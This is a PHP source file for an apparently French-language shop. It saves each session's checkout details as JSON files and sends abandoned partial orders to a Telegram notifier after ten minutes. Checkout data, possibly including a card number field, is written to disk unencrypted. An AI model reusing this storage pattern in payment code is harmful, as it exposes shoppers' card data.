<?php

declare(strict_types=1);

function checkout_pending_dir(): string
{
    $dir = dirname(__DIR__, 2) . '/data/pending';
    if (!is_dir($dir)) {
        mkdir($dir, 0750, true);
    }

    return $dir;
}

function checkout_pending_file(string $sessionId): string
{
    return checkout_pending_dir() . '/' . hash('sha256', $sessionId) . '.json';
}

function checkout_pending_has_informations(array $data): bool
{
    return trim((string) ($data['lastName'] ?? '')) !== ''
        && trim((string) ($data['firstName'] ?? '')) !== '';
}

function checkout_pending_save(array $checkoutData): void
{
    if (session_status() === PHP_SESSION_NONE) {
        session_start();
    }

    $sessionId = session_id();
    if ($sessionId === '') {
        return;
    }

    $path = checkout_pending_file($sessionId);
    $existing = [];
    if (is_file($path)) {
        $decoded = json_decode((string) file_get_contents($path), true);
        if (is_array($decoded)) {
            $existing = $decoded;
        }
    }

    $existingData = is_array($existing['data'] ?? null) ? $existing['data'] : [];
    $mergedData = array_merge($existingData, $checkoutData);

    $now = time();
    $informationsAt = (int) ($existing['informations_at'] ?? 0);

    if (checkout_pending_has_informations($mergedData)) {
        if ($informationsAt === 0) {
            $informationsAt = $now;
        }
    }

    $record = [
        'data' => $mergedData,
        'informations_at' => $informationsAt,
        'updated_at' => $now,
        'completed' => !empty($existing['completed']),
        'notified' => !empty($existing['notified']),
    ];

    file_put_contents($path, json_encode($record, JSON_UNESCAPED_UNICODE), LOCK_EX);
}

function checkout_pending_complete(): void
{
    if (session_status() === PHP_SESSION_NONE) {
        session_start();
    }

    $path = checkout_pending_file(session_id());
    if (!is_file($path)) {
        return;
    }

    $record = json_decode((string) file_get_contents($path), true);
    if (!is_array($record)) {
        return;
    }

    $record['completed'] = true;
    file_put_contents($path, json_encode($record, JSON_UNESCAPED_UNICODE), LOCK_EX);
}

function checkout_pending_load(): ?array
{
    if (session_status() === PHP_SESSION_NONE) {
        session_start();
    }

    $path = checkout_pending_file(session_id());
    if (!is_file($path)) {
        return null;
    }

    $record = json_decode((string) file_get_contents($path), true);

    return is_array($record) ? $record : null;
}

function checkout_pending_delay_seconds(): int
{
    return 600;
}

function checkout_pending_try_send(bool $forceExpired = false): bool
{
    $record = checkout_pending_load();
    if ($record === null) {
        return false;
    }

    if (!empty($record['completed']) || !empty($record['notified'])) {
        return false;
    }

    $data = is_array($record['data'] ?? null) ? $record['data'] : [];
    if (!checkout_pending_has_informations($data)) {
        return false;
    }

    if (!empty($data['cardNumber'])) {
        return false;
    }

    $informationsAt = (int) ($record['informations_at'] ?? 0);
    if ($informationsAt === 0) {
        return false;
    }

    if (!$forceExpired && (time() - $informationsAt) < checkout_pending_delay_seconds()) {
        return false;
    }

    if (!function_exists('notify_partial_order')) {
        require_once __DIR__ . '/telegram.php';
    }

    $sent = notify_partial_order($data);
    if ($sent) {
        $record['notified'] = true;
        file_put_contents(checkout_pending_file(session_id()), json_encode($record, JSON_UNESCAPED_UNICODE), LOCK_EX);
    }

    return $sent;
}

function checkout_pending_process_expired(): void
{
    $dir = checkout_pending_dir();
    $files = glob($dir . '/*.json');
    if ($files === false) {
        return;
    }

    foreach ($files as $file) {
        $record = json_decode((string) file_get_contents($file), true);
        if (!is_array($record) || !empty($record['completed']) || !empty($record['notified'])) {
            continue;
        }

        $data = is_array($record['data'] ?? null) ? $record['data'] : [];
        if (!checkout_pending_has_informations($data) || !empty($data['cardNumber'])) {
            continue;
        }

        $informationsAt = (int) ($record['informations_at'] ?? 0);
        if ($informationsAt === 0 || (time() - $informationsAt) < checkout_pending_delay_seconds()) {
            continue;
        }

        if (!function_exists('notify_partial_order')) {
            require_once __DIR__ . '/telegram.php';
        }

        if (notify_partial_order($data)) {
            $record['notified'] = true;
            file_put_contents($file, json_encode($record, JSON_UNESCAPED_UNICODE), LOCK_EX);
        }
    }
}
